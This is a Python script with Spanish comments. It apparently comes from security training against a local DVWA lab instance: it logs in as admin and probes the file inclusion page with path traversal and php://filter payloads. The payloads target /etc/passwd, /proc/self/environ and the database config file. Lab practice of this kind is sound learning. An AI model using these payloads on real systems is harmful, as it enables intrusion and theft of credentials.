import requests
from bs4 import BeautifulSoup

# URL base de DVWA (ajusta si usas IP o dominio distinto)
base_url = "http://localhost"
s = requests.Session()

# === LOGIN ===
def login():
    print("🔐 Iniciando sesión en DVWA...")
    login_page = s.get(f"{base_url}/login.php")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})

    if not token_input:
        print("❌ No se encontró token de login.")
        exit(1)

    user_token = token_input['value']
    login_data = {
        'username': 'admin',
        'password': 'csrf12345',  # ← Contraseña actualizada después del CSRF
        'Login': 'Login',
        'user_token': user_token
    }

    response = s.post(f"{base_url}/login.php", data=login_data)

    if "Logout" in response.text:
        print("✅ Login exitoso.")
    else:
        print("❌ Falló el login.")
        print("\n--- HTML recibido ---\n")
        print(response.text)
        exit(1)

# === PROBAR INCLUSIONES DE ARCHIVOS ===
def probar_lfi(paths):
    print("\n🔍 Probando posibles inclusiones...\n")
    for path in paths:
        url = f"{base_url}/vulnerabilities/fi/?page={path}"
        response = s.get(url)

        print(f"🧪 Probando: {path}")
        if "root:x" in response.text or "DB_PASSWORD" in response.text:
            print("💥 Posible inclusión encontrada:")
            print("\n".join(response.text.splitlines()[0:15]))  # Muestra primeras líneas
            print("-" * 60)
        else:
            print("❌ Nada interesante.\n")

# === MAIN ===
if __name__ == "__main__":
    login()

    posibles_paths = [
        "../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../proc/self/environ",
        "../../config/config.inc.php",
        "../config.inc.php",
        "php://filter/convert.base64-encode/resource=index"
    ]

    probar_lfi(posibles_paths)
